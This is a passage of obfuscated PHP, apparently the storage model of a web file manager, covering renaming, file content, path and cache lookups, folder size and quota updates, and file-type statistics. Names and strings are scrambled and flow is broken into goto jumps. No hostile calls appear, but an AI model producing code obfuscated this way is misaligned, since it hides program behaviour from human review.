F¨Ü†å®Øë: $a½¿³‘ëÇÎ = $B¢É˜ÜÑ’Ä[1919] . $c­¢°ê™„…[$B¢É˜ÜÑ’Ä[487]]; if (isset(self::$cacheChildList[$a½¿³‘ëÇÎ])) { unset(self::$cacheChildList[$a½¿³‘ëÇÎ]); } return $A¹³ÃóŞ; goto e‰Èæ°ê®ô; DØ‡â©¨œ‹: $e„ƒğğñî’ = $this->fileNameExist($c­¢°ê™„…[$B¢É˜ÜÑ’Ä[487]], $eó…«Âç¸¢); if ($e„ƒğğñî’ && $e„ƒğğñî’ != $cŸÅÚóÊâÂ) { return !1; } $fª›¶³ƒÊ = array($B¢É˜ÜÑ’Ä[411] => $eó…«Âç¸¢, $B¢É˜ÜÑ’Ä[550] => USER_ID); goto bğÜâ®–Ş; fØ“«ßÇ¦÷: $B¢É˜ÜÑ’Ä =& $_SERVER[¢Í]; $c­¢°ê™„… = $this->sourceInfo($cŸÅÚóÊâÂ); if (!$c­¢°ê™„…) { return !1; } goto DØ‡â©¨œ‹; bğÜâ®–Ş: if (!$c­¢°ê™„…[$B¢É˜ÜÑ’Ä[395]] == $B¢É˜ÜÑ’Ä[93]) { $fª›¶³ƒÊ[$B¢É˜ÜÑ’Ä[397]] = get_path_ext($eó…«Âç¸¢); } Model($B¢É˜ÜÑ’Ä[531])->eventRename($cŸÅÚóÊâÂ, $c­¢°ê™„…[$B¢É˜ÜÑ’Ä[28]], $eó…«Âç¸¢); $this->sourceCacheClear($cŸÅÚóÊâÂ); goto E™½ÖÙ“ƒÕ; e‰Èæ°ê®ô: } public function setNamePinyin($fÍŒÍ‹„ï×, $bÉƒ‘•¬›Š, $CÎ¦è‰‡‚¢ = true) { $eâÉâµ =& $_SERVER[¢Í]; $BµÉ³ƒ´µ = Input::check($bÉƒ‘•¬›Š, $eâÉâµ[554]); if ($CÎ¦è‰‡‚¢ && !$BµÉ³ƒ´µ) { return; } if (!$BµÉ³ƒ´µ) { $this->metaSet($fÍŒÍ‹„ï×, $eâÉâµ[441], null); $this->metaSet($fÍŒÍ‹„ï×, $eâÉâµ[440], null); return; } $c¼ÇÃ¾½Ò = array($eâÉâµ[441] => str_replace($eâÉâµ[50], $eâÉâµ[33], Pinyin::encode($bÉƒ‘•¬›Š)), $eâÉâµ[440] => Pinyin::encode($bÉƒ‘•¬›Š, $eâÉâµ[555])); $this->metaSet($fÍŒÍ‹„ï×, $c¼ÇÃ¾½Ò); } public function getContent($bŞâóÂä‚ƒ) { goto Cß™¼Ÿç; bóªãÙ‚õó: if ($D‡æĞ•¼Ù[$b³ß‰á£œ[87]] == 0) { return $b³ß‰á£œ[33]; } $EùÖ¶à´Ê = $b³ß‰á£œ[1933] . $D‡æĞ•¼Ù[$b³ß‰á£œ[177]]; if ($D‡æĞ•¼Ù[$b³ß‰á£œ[87]] <= 1024 * 10) { $fë ’òÑ«æ = Cache::get($EùÖ¶à´Ê); if (!$fë ’òÑ«æ) { $fë ’òÑ«æ = IO::getContent($D‡æĞ•¼Ù[$b³ß‰á£œ[85]]); Cache::set($EùÖ¶à´Ê, $fë ’òÑ«æ); } return $fë ’òÑ«æ; } goto BØëçò’ø’; Cß™¼Ÿç: $b³ß‰á£œ =& $_SERVER[¢Í]; $D‡æĞ•¼Ù = $this->fileInfoGet($bŞâóÂä‚ƒ); if (!$D‡æĞ•¼Ù) { return !1; } goto bóªãÙ‚õó; BØëçò’ø’: if (!$D‡æĞ•¼Ù[$b³ß‰á£œ[85]]) { return $b³ß‰á£œ[33]; } return IO::getContent($D‡æĞ•¼Ù[$b³ß‰á£œ[85]]); goto aØ¶äÕÛÙŒ; aØ¶äÕÛÙŒ: } public function setDesc($B¿íøã¿ìï, $A”Åèïì) { $CŒŞÒ˜ Ãæ =& $_SERVER[¢Í]; Model($CŒŞÒ˜ Ãæ[531])->eventAddDesc($B¿íøã¿ìï, $A”Åèïì); return $this->metaSet($B¿íøã¿ìï, $CŒŞÒ˜ Ãæ[430], $A”Åèïì); } public function setContent($F±œ¿ğŸ , $cØ‚Œİ –‰ = '') { goto fÂá’â–õÇ; f‘¡•ô„ó„: if (!$bÅ¬¥Å›Ú || !$c½Ò…¬¾) { return !1; } $B°³ê×œ = Model($c‰ä‰¼–“Õ[447])->addFileByContent($cØ‚Œİ –‰, $c½Ò…¬¾[$c‰ä‰¼–“Õ[28]]); $Dƒ¼õ“ƒäò = $this->fileHistory($c½Ò…¬¾, $B°³ê×œ[$c‰ä‰¼–“Õ[444]], $B°³ê×œ[$c‰ä‰¼–“Õ[87]]); goto bÖšÜ¤‘ä; fÂá’â–õÇ: $c‰ä‰¼–“Õ =& $_SERVER[¢Í]; $c½Ò…¬¾ = $this->sourceInfo($F±œ¿ğŸ ); $bÅ¬¥Å›Ú = $this->fileInfoGet($F±œ¿ğŸ ); goto f‘¡•ô„ó„; bÖšÜ¤‘ä: if (!$Dƒ¼õ“ƒäò) { return Model($c‰ä‰¼–“Õ[447])->remove($B°³ê×œ[$c‰ä‰¼–“Õ[444]]); } $this->folderSizeReset($c½Ò…¬¾[$c‰ä‰¼–“Õ[487]]); return !0; goto còÏÛêì; còÏÛêì: } public function fileSubstr($bÀ“¬ºİ•Ò, $B´¢ìäÇó, $e©®Âµ•®) { $cæŒâÛó†õ = $this->fileInfoGet($bÀ“¬ºİ•Ò); if (!$cæŒâÛó†õ) { return !1; } return IO::fileSubstr($cæŒâÛó†õ[$_SERVER[¢Í][85]], $B´¢ìäÇó, $e©®Âµ•®); } public function fileInfoGet($cä¼°¥êáæ) { goto d–®“ºøÅ; c±¦²£ä†á: $DÀ­†®§‚ = Model($F²¹¾óÌÒ[447])->fileInfo($b¬†æÛĞÄİ[$F²¹¾óÌÒ[444]]); if ($DÀ­†®§‚) { $DÀ­†®§‚[$F²¹¾óÌÒ[28]] = $b¬†æÛĞÄİ[$F²¹¾óÌÒ[28]]; } self::$cacheFileInfo[$d‹ŠÑÓŒî‹] = $DÀ­†®§‚; goto b†‹¸â§ù; b†‹¸â§ù: return $DÀ­†®§‚; goto DÀŒ‡îÂ®ß; fÍ´ ˆè’¯: $d‹ŠÑÓŒî‹ = $F²¹¾óÌÒ[450] . $b¬†æÛĞÄİ[$F²¹¾óÌÒ[444]]; $AïãÒí”ø = _get(self::$cacheFileInfo, $d‹ŠÑÓŒî‹); if ($AïãÒí”ø) { return $AïãÒí”ø; } goto c±¦²£ä†á; d–®“ºøÅ: $F²¹¾óÌÒ =& $_SERVER[¢Í]; $b¬†æÛĞÄİ = $this->sourceInfo($cä¼°¥êáæ); if (!$b¬†æÛĞÄİ || $b¬†æÛĞÄİ[$F²¹¾óÌÒ[395]]) { return !1; } goto fÍ´ ˆè’¯; DÀŒ‡îÂ®ß: } private function folderChildrenNumber($EÛĞ ÌÀÔ) { $EéÖò•ŠŸ =& $_SERVER[¢Í]; $dêÀ¦­ò•‚ = $this->sourceInfo($EÛĞ ÌÀÔ); $D‡ÕÏ˜™¨• = array($EéÖò•ŠŸ[551] => array($EéÖò•ŠŸ[509], $dêÀ¦­ò•‚[$EéÖò•ŠŸ[485]] . $EÛĞ ÌÀÔ . $EéÖò•ŠŸ[510]), $EéÖò•ŠŸ[421] => intval($dêÀ¦­ò•‚[$EéÖò•ŠŸ[422]]), $EéÖò•ŠŸ[544] => 1); $B¯è–Øã©í = $this->where($D‡ÕÏ˜™¨•)->count(); $c¬ğò‚ = $this->where($D‡ÕÏ˜™¨•)->where(array($EéÖò•ŠŸ[544] => 0))->count(); return array($EéÖò•ŠŸ[91] => $c¬ğò‚, $EéÖò•ŠŸ[92] => $B¯è–Øã©í); } public function pathInfo($EËŞâ·Àò™, $dœ§ñƒ¸‘Ö = false) { goto E—‹ãƒÉÊ; BÖÉÏÓŒŒÀ: $A†ãÅ…Çì = $this->sourceInfo($EËŞâ·Àò™); if (!$A†ãÅ…Çì) { return !1; } $A†ãÅ…Çì = $this->_listDataApplyItem($A†ãÅ…Çì, $dœ§ñƒ¸‘Ö); goto B¡ÙÄô³ÍÙ; c½©ªÊŠ¤ª: $F››Šƒ§ÓŒ = $d—¤—Ş£øä[436] . intval($dœ§ñƒ¸‘Ö) . $d—¤—Ş£øä[437] . $EËŞâ·Àò™; $bÁñ’îÛŠ‘ = _get(self::$cachePathInfo, $F››Šƒ§ÓŒ); if ($bÁñ’îÛŠ‘) { return $bÁñ’îÛŠ‘; } goto BÖÉÏÓŒŒÀ; B¡ÙÄô³ÍÙ: self::$cachePathInfo[$F››Šƒ§ÓŒ] = $A†ãÅ…Çì; return $A†ãÅ…Çì; goto E™ĞÈÖƒÅÃ; E—‹ãƒÉÊ: $d—¤—Ş£øä =& $_SERVER[¢Í]; $dœ§ñƒ¸‘Ö = !1; $EËŞâ·Àò™ = intval($EËŞâ·Àò™); goto c½©ªÊŠ¤ª; E™ĞÈÖƒÅÃ: } public static $cachePathInfoMore = array(); public function pathInfoMore($fÍ”ºÄÍÆ) { goto E½±»ø—; e»ÄÓöõ: $A¡–÷»Äï = $this->pathInfo($fÍ”ºÄÍÆ); if (!$A¡–÷»Äï) { return !1; } if ($A¡–÷»Äï[$fë÷‹ÉÓø…[395]] == $fë÷‹ÉÓø…[93]) { $A¡–÷»Äï[$fë÷‹ÉÓø…[90]] = $this->folderChildrenNumber($fÍ”ºÄÍÆ); } goto bƒ¾ÏØÂ¼Õ; E½±»ø—: $fë÷‹ÉÓø… =& $_SERVER[¢Í]; $c¸µÉ»•Ò = _get(self::$cachePathInfoMore, $fÍ”ºÄÍÆ); if ($c¸µÉ»•Ò) { return $c¸µÉ»•Ò; } goto e»ÄÓöõ; bƒ¾ÏØÂ¼Õ: self::$cachePathInfoMore[$fÍ”ºÄÍÆ] = $A¡–÷»Äï; return $A¡–÷»Äï; goto F‰²´ˆ£Å’; F‰²´ˆ£Å’: } public function sourceInfo($e†î£Ù¸Õ) { goto b¬¡ë÷Ö’‰; dÇ¤•Á”‹: $F¡Šî¥Û²Š = $this->where(array($CƒŠÑ±ö¨Æ[394] => $e†î£Ù¸Õ))->find(); self::$cacheSourceInfo[$bêˆ„¨²ƒ] = $F¡Šî¥Û²Š; return self::$cacheSourceInfo[$bêˆ„¨²ƒ]; goto b“ÏÌ™‘±; cî¾‹Ç²Ş: $bêˆ„¨²ƒ = $CƒŠÑ±ö¨Æ[435] . $e†î£Ù¸Õ; $fŒèÜË•ßÏ = _get(self::$cacheSourceInfo, $bêˆ„¨²ƒ); if ($fŒèÜË•ßÏ) { return $fŒèÜË•ßÏ; } goto dÇ¤•Á”‹; b¬¡ë÷Ö’‰: $CƒŠÑ±ö¨Æ =& $_SERVER[¢Í]; if (!$e†î£Ù¸Õ) { return array(); } $e†î£Ù¸Õ = intval($e†î£Ù¸Õ); goto cî¾‹Ç²Ş; b“ÏÌ™‘±: } public function sourceCacheClear($Eñ£‚§Ûõ = false) { self::cacheClear($Eñ£‚§Ûõ); } public static function cacheClear($E”ŠŠ½²Æ = false) { $AŞæä½›› =& $_SERVER[¢Í]; if ($E”ŠŠ½²Æ == !1) { goto Cªë±ŞãÊ“; Cªë±ŞãÊ“: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto d‘îµƒÑÑ’; aêË‡ğœ–­: return; goto dîñ¢Æ–ó¯; d‘îµƒÑÑ’: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto aêË‡ğœ–­; dîñ¢Æ–ó¯: } unset(self::$cacheSourceInfo[$AŞæä½››[435] . $E”ŠŠ½²Æ]); unset(self::$cachePathInfoMore[$E”ŠŠ½²Æ]); unset(self::$cachePathInfo[$AŞæä½››[1934] . $E”ŠŠ½²Æ]); unset(self::$cachePathInfo[$AŞæä½››[1935] . $E”ŠŠ½²Æ]); } public function metaSet($f©ÕÂ¿à×, $aò¢£ä§ôó = null, $Dòˆ“Ü‘„ = null) { $CøÉ¦‘áÜ = parent::metaSet($f©ÕÂ¿à×, $aò¢£ä§ôó, $Dòˆ“Ü‘„); if ($CøÉ¦‘áÜ) { $this->sourceCacheClear($f©ÕÂ¿à×); } return $CøÉ¦‘áÜ; } public function pathInfoByPath($Eóá±ƒ£Õ, $EÓ¦ĞĞšç¤) { $EÇ­í×»ö¥ =& $_SERVER[¢Í]; $bˆù÷·ö‹ = !$EÓ¦ĞĞšç¤ ? array() : explode($EÇ­í×»ö¥[8], trim($EÓ¦ĞĞšç¤, $EÇ­í×»ö¥[8])); $E˜ù‰£ì½§ = $Eóá±ƒ£Õ; foreach ($bˆù÷·ö‹ as $F©íã¤öÚÁ) { $A‚Ÿ¨œ©Ó× = array($EÇ­í×»ö¥[487] => $E˜ù‰£ì½§, $EÇ­í×»ö¥[28] => $F©íã¤öÚÁ); $aÒ‹Ä‚‰ƒ = $this->where($A‚Ÿ¨œ©Ó×)->select(); if (!$aÒ‹Ä‚‰ƒ) { return !1; } $aÒ‹Ä‚‰ƒ = array_sort_by($aÒ‹Ä‚‰ƒ, $EÇ­í×»ö¥[422]); $E˜ù‰£ì½§ = $aÒ‹Ä‚‰ƒ[0][$EÇ­í×»ö¥[394]]; } return $this->pathInfo($E˜ù‰£ì½§, !0); } protected function updateModifyTime($fëÜ™”ëÒ) { goto A•Œ¾¨ë¡; EÈ­¸á ‡¾: foreach ($fëÜ™”ëÒ as $AÛ¶Œò¿ => $eÌ¬¬îÕòİ) { $fëÜ™”ëÒ[$AÛ¶Œò¿] = intval($eÌ¬¬îÕòİ); $this->sourceCacheClear($eÌ¬¬îÕòİ); } $fó¾Í×Ç¿Í = array($cÊœ‹òÖ‚å[394] => array($cÊœ‹òÖ‚å[7], $fëÜ™”ëÒ)); $EïÇ—©ñé» = array($cÊœ‹òÖ‚å[550] => USER_ID, $cÊœ‹òÖ‚å[415] => time()); goto c¤äÌã‡ƒÈ; A•Œ¾¨ë¡: $cÊœ‹òÖ‚å =& $_SERVER[¢Í]; if (!$fëÜ™”ëÒ) { return; } if (!is_array($fëÜ™”ëÒ)) { $fëÜ™”ëÒ = array($fëÜ™”ëÒ); } goto EÈ­¸á ‡¾; c¤äÌã‡ƒÈ: $this->where($fó¾Í×Ç¿Í)->save($EïÇ—©ñé»); goto d¼ñè¶¹¢; d¼ñè¶¹¢: } public function folderSizeReset($F’Œ›İì¡, $C†¨¾Å‰ÖŠ = false) { goto Bğ…Ã“ê¢á; DÆêÁ¯Äê–: $dÚöŸ×…ğà[] = $aÚŸËê…õš[$eÉ•ÀàÎ¾[394]]; $dô¤ÍáéíÛ = array($eÉ•ÀàÎ¾[394] => array($eÉ•ÀàÎ¾[409], $dÚöŸ×…ğà)); if ($C†¨¾Å‰ÖŠ < 0) { $dô¤ÍáéíÛ[$eÉ•ÀàÎ¾[87]] = array($eÉ•ÀàÎ¾[940], abs($C†¨¾Å‰ÖŠ)); } goto Añ¸Ì‘ÈÖ; Añ¸Ì‘ÈÖ: $this->where($dô¤ÍáéíÛ)->setAdd($eÉ•ÀàÎ¾[87], $C†¨¾Å‰ÖŠ); CacheLock::unlock($EŒÓİù²¸æ); $this->targetSpaceUpdate($aÚŸËê…õš[$eÉ•ÀàÎ¾[396]], $aÚŸËê…õš[$eÉ•ÀàÎ¾[482]]); goto a‰…Ö©‰¶©; Fè¥¶Éé‰Ğ: if ($C†¨¾Å‰ÖŠ == 0) { return CacheLock::unlock($EŒÓİù²¸æ); } $dÚöŸ×…ğà = $this->parentLevelArray($aÚŸËê…õš[$eÉ•ÀàÎ¾[485]]); if (!$dÚöŸ×…ğà) { $dÚöŸ×…ğà = array(); } goto DÆêÁ¯Äê–; Bğ…Ã“ê¢á: $eÉ•ÀàÎ¾ =& $_SERVER[¢Í]; if ($this->statusIgnoreResetSpace) { return; } $aÚŸËê…õš = $this->sourceInfo($F’Œ›İì¡); goto b˜²êáÌ–; b˜²êáÌ–: $EŒÓİù²¸æ = $eÉ•ÀàÎ¾[1936] . $F’Œ›İì¡; CacheLock::lock($EŒÓİù²¸æ, 20); if ($C†¨¾Å‰ÖŠ === !1) { $this->sourceCacheClear($F’Œ›İì¡); $aÚŸËê…õš = $this->sourceInfo($F’Œ›İì¡); $dô¤ÍáéíÛ = array($eÉ•ÀàÎ¾[393] => $F’Œ›İì¡, $eÉ•ÀàÎ¾[421] => 0); $BæÎ†¦Ë¬ = $this->where($dô¤ÍáéíÛ)->sum($eÉ•ÀàÎ¾[87]); $C†¨¾Å‰ÖŠ = intval($BæÎ†¦Ë¬) - intval($aÚŸËê…õš[$eÉ•ÀàÎ¾[87]]); } goto Fè¥¶Éé‰Ğ; a‰…Ö©‰¶©: } public function folderSizeResetChildren($b½¬Ê£ä£õ) { goto cÙ¬Åğ²‡×; FÁ¨ÂòàÙ²: foreach ($e—‘È˜Ó­Ì as $e³âƒŠ”) { $DÍŞôï‰ˆ = $e³âƒŠ”[$EƒÌ‚£ôŞˆ[487]] . $EƒÌ‚£ôŞˆ[33]; if (!isset($FÍ½‰Áëó´[$DÍŞôï‰ˆ])) { continue; } if ($e³âƒŠ”[$EƒÌ‚£ôŞˆ[422]] == $FÍ½‰Áëó´[$DÍŞôï‰ˆ][$EƒÌ‚£ôŞˆ[422]]) { $FÍ½‰Áëó´[$DÍŞôï‰ˆ][$EƒÌ‚£ôŞˆ[87]] += $e³âƒŠ”[$EƒÌ‚£ôŞˆ[87]]; } } foreach ($FÍ½‰Áëó´ as $e³âƒŠ”) { $C¹éäÙİªË = $this->parentLevelArray($e³âƒŠ”[$EƒÌ‚£ôŞˆ[485]]); foreach ($C¹éäÙİªË as $DÍŞôï‰ˆ) { $DÍŞôï‰ˆ = $DÍŞôï‰ˆ . $EƒÌ‚£ôŞˆ[33]; if (!isset($FÍ½‰Áëó´[$DÍŞôï‰ˆ])) { continue; } if ($e³âƒŠ”[$EƒÌ‚£ôŞˆ[422]] == $FÍ½‰Áëó´[$DÍŞôï‰ˆ][$EƒÌ‚£ôŞˆ[422]]) { $FÍ½‰Áëó´[$DÍŞôï‰ˆ][$EƒÌ‚£ôŞˆ[87]] += $e³âƒŠ”[$EƒÌ‚£ôŞˆ[87]]; } } } $eç•—½£Â” = array(); goto aêåÙÁğê¥; aîëßÕã: $FÍ½‰Áëó´[] = $E÷Ë°„ÓêÖ; $FÍ½‰Áëó´ = array_to_keyvalue($FÍ½‰Áëó´, $EƒÌ‚£ôŞˆ[394]); foreach ($FÍ½‰Áëó´ as $Eè–‘ÓíÚÀ => $e³âƒŠ”) { $FÍ½‰Áëó´[$Eè–‘ÓíÚÀ][$EƒÌ‚£ôŞˆ[1938]] = $FÍ½‰Áëó´[$Eè–‘ÓíÚÀ][$EƒÌ‚£ôŞˆ[87]]; $FÍ½‰Áëó´[$Eè–‘ÓíÚÀ][$EƒÌ‚£ôŞˆ[87]] = 0; } goto FÁ¨ÂòàÙ²; fÆ—°¸éñà: $aš•ŞêãÁŞ = array($EƒÌ‚£ôŞˆ[544] => 1, $EƒÌ‚£ôŞˆ[551] => array($EƒÌ‚£ôŞˆ[509], $E÷Ë°„ÓêÖ[$EƒÌ‚£ôŞˆ[485]] . $b½¬Ê£ä£õ . $EƒÌ‚£ôŞˆ[510])); $Dª‹Äİ÷È = $EƒÌ‚£ôŞˆ[1937]; $FÍ½‰Áëó´ = $this->field($Dª‹Äİ÷È)->where($aš•ŞêãÁŞ)->select(); goto d¨ñ¿¶ë„Æ; d¨ñ¿¶ë„Æ: $aš•ŞêãÁŞ[$EƒÌ‚£ôŞˆ[395]] = 0; $e—‘È˜Ó­Ì = $this->field($Dª‹Äİ÷È)->where($aš•ŞêãÁŞ)->select(); if (!$e—‘È˜Ó­Ì) { return; } goto aîëßÕã; cÙ¬Åğ²‡×: $EƒÌ‚£ôŞˆ =& $_SERVER[¢Í]; $this->sourceCacheClear($b½¬Ê£ä£õ); $E÷Ë°„ÓêÖ = $this->sourceInfo($b½¬Ê£ä£õ); goto fÆ—°¸éñà; aêåÙÁğê¥: foreach ($FÍ½‰Áëó´ as $e³âƒŠ”) { if ($e³âƒŠ”[$EƒÌ‚£ôŞˆ[87]] == $e³âƒŠ”[$EƒÌ‚£ôŞˆ[1938]]) { continue; } $eç•—½£Â”[] = array($EƒÌ‚£ôŞˆ[394], $e³âƒŠ”[$EƒÌ‚£ôŞˆ[394]], $EƒÌ‚£ôŞˆ[87], $e³âƒŠ”[$EƒÌ‚£ôŞˆ[87]]); } $this->saveAll($eç•—½£Â”); goto f³¦Á»†¤ö; f³¦Á»†¤ö: } public function userSpaceReset($Bãó»ÇùÛ× = false) { $BÌÏ©‡ÌŞ =& $_SERVER[¢Í]; $d†Ëˆ•Š·œ = $this->where(array($BÌÏ©‡ÌŞ[396] => self::TYPE_USER, $BÌÏ©‡ÌŞ[482] => $Bãó»ÇùÛ×, $BÌÏ©‡ÌŞ[395] => 0))->sum($BÌÏ©‡ÌŞ[87]); Model($BÌÏ©‡ÌŞ[500])->userEdit($Bãó»ÇùÛ×, array($BÌÏ©‡ÌŞ[1634] => $d†Ëˆ•Š·œ)); } public function targetSpaceUpdate($Féé»ã‹¡÷, $C¢ğÒÁÛÀ) { $bö„…Ÿˆ =& $_SERVER[¢Í]; if (!$C¢ğÒÁÛÀ) { return; } if (!in_array($Féé»ã‹¡÷, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $eÓ•¹Ö½ä = $this->targetSpaceSize($Féé»ã‹¡÷, $C¢ğÒÁÛÀ); if ($Féé»ã‹¡÷ == self::TYPE_USER) { Model($bö„…Ÿˆ[500])->userEdit($C¢ğÒÁÛÀ, array($bö„…Ÿˆ[1634] => $eÓ•¹Ö½ä)); } else { if ($Féé»ã‹¡÷ == self::TYPE_GROUP) { Model($bö„…Ÿˆ[484])->groupEdit($C¢ğÒÁÛÀ, array($bö„…Ÿˆ[1634] => $eÓ•¹Ö½ä)); } } } public function targetSpaceSize($dºËˆÊË•…, $c„ë‚†¹ŞÙ) { goto AÁÃãáî; AÁÃãáî: $C“‹ğ¬Î£ =& $_SERVER[¢Í]; $F» ¹Ø‡” = $this->sourceRoot($dºËˆÊË•…, $c„ë‚†¹ŞÙ, !0); if (!$F» ¹Ø‡”) { return 0; } goto F­ª–×ñ™Œ; dêåğ”Ïµ“: $b÷«”÷™ = array_to_keyvalue($b÷«”÷™, $C“‹ğ¬Î£[33], $C“‹ğ¬Î£[394]); $b÷«”÷™ = array_unique(array_filter($b÷«”÷™)); if ($b÷«”÷™) { $Fö®ŒÔŠò» = array($C“‹ğ¬Î£[408] => array($C“‹ğ¬Î£[409], $b÷«”÷™)); $FÄ¯Ñ¬ö‹í += floatval($this->where($Fö®ŒÔŠò»)->sum($C“‹ğ¬Î£[87])); } goto b‘Ú×Óˆâ; b‘Ú×Óˆâ: return $FÄ¯Ñ¬ö‹í; goto AíØ‚ò›Áô; F­ª–×ñ™Œ: $FÄ¯Ñ¬ö‹í = floatval($F» ¹Ø‡”[$C“‹ğ¬Î£[87]]); $Fö®ŒÔŠò» = array($C“‹ğ¬Î£[551] => array($C“‹ğ¬Î£[509], $C“‹ğ¬Î£[496] . $F» ¹Ø‡”[$C“‹ğ¬Î£[394]] . $C“‹ğ¬Î£[510])); $b÷«”÷™ = Model($C“‹ğ¬Î£[420])->field($C“‹ğ¬Î£[408])->where($Fö®ŒÔŠò»)->select(); goto dêåğ”Ïµ“; AíØ‚ò›Áô: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($fòñØÊÉòÎ) { return $this->fileTypeProfile($fòñØÊÉòÎ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Bğî±ùõÃ¯) { return $this->fileTypeProfile($Bğî±ùõÃ¯, SourceModel::TYPE_GROUP); } private function fileTypeProfile($eõÉéñ¯ÃÏ, $F¨Ü†´òŸ) { goto Bù÷…‘½Úô; fÇ’½îÛ¢: $déÉª³ÌŠ = array(); $déÉª³ÌŠ[$fŠ¡åãÉ¦¯[1940]] = array($fŠ¡åãÉ¦¯[1941] => LNG($fŠ¡åãÉ¦¯[1940]), $fŠ¡åãÉ¦¯[1942] => $this->where($fãïÊõÉŸÃ)->count(), $fŠ¡åãÉ¦¯[546] => $this->where($fãïÊõÉŸÃ)->sum($fŠ¡åãÉ¦¯[87])); $eá·ÄÌ‡µ™ = KodIO::fileTypeList(); goto bæº™Ö—º; bæº™Ö—º: foreach ($eá·ÄÌ‡µ™ as $d¯—º‘İáŸ => $EÜ··Ú›×Ù) { $fãïÊõÉŸÃ[$fŠ¡åãÉ¦¯[397]] = $this->fileTypeWhere($d¯—º‘İáŸ); $déÉª³ÌŠ[$d¯—º‘İáŸ] = array($fŠ¡åãÉ¦¯[1941] => $EÜ··Ú›×Ù[$fŠ¡åãÉ¦¯[28]], $fŠ¡åãÉ¦¯[1942] => $this->where($fãïÊõÉŸÃ)->count(), $fŠ¡åãÉ¦¯[546] => $this->where($fãïÊõÉŸÃ)->sum($fŠ¡åãÉ¦¯[87])); } Cache::set($F¡èº¯ªƒ, $déÉª³ÌŠ, 1200); return $déÉª³ÌŠ; goto d„‘»Ãµğ¶; Bù÷…‘½Úô: $fŠ¡åãÉ¦¯ =& $_SERVER[¢Í]; $F¡èº¯ªƒ = $fŠ¡åãÉ¦¯[1939] . $eõÉéñ¯ÃÏ . $fŠ¡åãÉ¦¯[80] . $F¨Ü†´òŸ; $bó„Ñ“Ø˜„ = Cache::get($F¡èº¯ªƒ); goto Fì®ğÆ¡±; Fì®ğÆ¡±: if ($bó„Ñ“Ø˜„) { return $bó„Ñ“Ø˜„; } $fãïÊõÉŸÃ = array($fŠ¡åãÉ¦¯[544] => 0); if ($eõÉéñ¯ÃÏ != !1) { $fãïÊõÉŸÃ[$fŠ¡åãÉ¦¯[482]] = $eõÉéñ¯ÃÏ; $fãïÊõÉŸÃ[$fŠ¡åãÉ¦¯[396]] = $F¨Ü†´òŸ; } goto fÇ’½îÛ¢; d„‘»Ãµğ¶: } public function fileNameExist($E±ŠŒ‹íäš, $fùÅéµ¡¸) { $dŞ‹Ê‚Î®¥ =& $_SERVER[¢Í]; $eºçÚÙ¼ˆì = $this->childList($E±ŠŒ‹íäš); foreach ($eºçÚÙ¼ˆì as $F®«ñâ†) { if ($F®«ñâ†[$dŞ‹Ê‚Î®¥[28]] == $fùÅéµ¡¸) { return $F®«ñâ†[$dŞ‹Ê‚Î®¥[394]]; } if (strtolower($F®«ñâ†[$dŞ‹Ê‚Î®¥[28]]) == strtolower($fùÅéµ¡¸)) { return $F®«ñâ†[$dŞ‹Ê‚Î®¥[394]]; } } return !1; } public function childList($F×Èç™¨Âİ) { goto Cåòì‰‰â; Cåòì‰‰â: $c¦ÁÌÓòã¼ =& $_SERVER[¢Í]; $DÚñ¬¼×ñŞ = $c¦ÁÌÓòã¼[1919] . $F×Èç™¨Âİ; if (isset(self::$cacheChildList[$DÚñ¬¼×ñŞ])) { return self::$cacheChildList[$DÚñ¬¼×ñŞ]; } goto eºâè÷Ì; eºâè÷Ì: $f ğÛÔÃÍÃ = array($c¦ÁÌÓòã¼[487] => intval($F×Èç™¨Âİ), $c¦ÁÌÓòã¼[422] => 0); $bß†ÜÃš§” = $this->where($f ğÛÔÃÍÃ)->select(); $bß†ÜÃš§” = $bß†ÜÃš§” ? $bß†ÜÃš§” : array(); goto A¢Íù˜ÏµŞ; A¢Íù˜ÏµŞ: self::$cacheChildList[$DÚñ¬¼×ñŞ] = $bß†ÜÃš§”; foreach ($bß†ÜÃš§” as $eöÎ÷«Ÿˆ) { $DÚñ¬¼×ñŞ = $c¦ÁÌÓòã¼[435] . $eöÎ÷«Ÿˆ[$c¦ÁÌÓòã¼[394]]; self::$cacheSourceInfo[$DÚñ¬¼×ñŞ] = $eöÎ÷«Ÿˆ; } return $bß†ÜÃš§”; goto bçÌÌÍ¸š; bçÌÌÍ¸š: } public function fileNameAuto($AÊ«Š¡ù¹, $c¢»í‚í™‘, $e‹ŞÚÈá™ = REPEAT_RENAME, $b³«Š¿×Ìô = false) { $DÛ»»ØæƒÔ =& $_SERVER[¢Í]; $e±„ìè†õË = $this->childList($AÊ«Š¡ù¹); $dœ‰¾äÈõá = array_to_keyvalue($e±„ìè†õË, $DÛ»»ØæƒÔ[33], $DÛ»»ØæƒÔ[28]); return $this->fileNameAutoGet($dœ‰¾äÈõá, $c¢»í‚í™‘, $e‹ŞÚÈá™, $b³«Š¿×Ìô); } public function fileNameAutoGet($a›ö¢Œœ, $fÛ¿ãê¤‡ù, $cÂÁÆª°íÚ, $bµ‡ñ‡“ø›) { $AĞî–ó¸‚ì =& $_SERVER[¢Í]; if ($cÂÁÆª°íÚ == REPEAT_REPLACE || !$a›ö¢Œœ || !in_array_not_case($fÛ¿ãê¤‡ù, $a›ö¢Œœ) || $bµ‡ñ‡“ø› && $cÂÁÆª°íÚ != REPEAT_RENAME_FOLDER) { return $fÛ¿ãê¤‡ù; } if ($cÂÁÆª°íÚ == REPEAT_SKIP) { return !1; } $D‡İ’»íÉÔ = $AĞî–ó¸‚ì[101] . get_path_ext($fÛ¿ãê¤‡ù); $D‡İ’»íÉÔ = $D‡İ’»íÉÔ == $AĞî–ó¸‚ì[101] || $bµ‡ñ‡“ø› ? $AĞî–ó¸‚ì[33] : $D‡İ’»íÉÔ; for ($B’‘×õÙò = 1; $B’‘×õÙò <= count($a›ö¢Œœ) + 1; $B’‘×õÙò++) { $DøÆø ‰Å˜ = substr($fÛ¿ãê¤‡ù, 0, strlen($fÛ¿ãê¤‡ù) - strlen($D‡İ’»íÉÔ)); $eãÅÊˆã¶ô = $DøÆø ‰Å˜ . "\50{$B’‘×õÙò}\x29{$D‡İ’»íÉÔ}"; if (!in_array_not_case($eãÅÊˆã¶ô, $a›ö¢Œœ)) { return $eãÅÊˆã¶ô; } } } } class 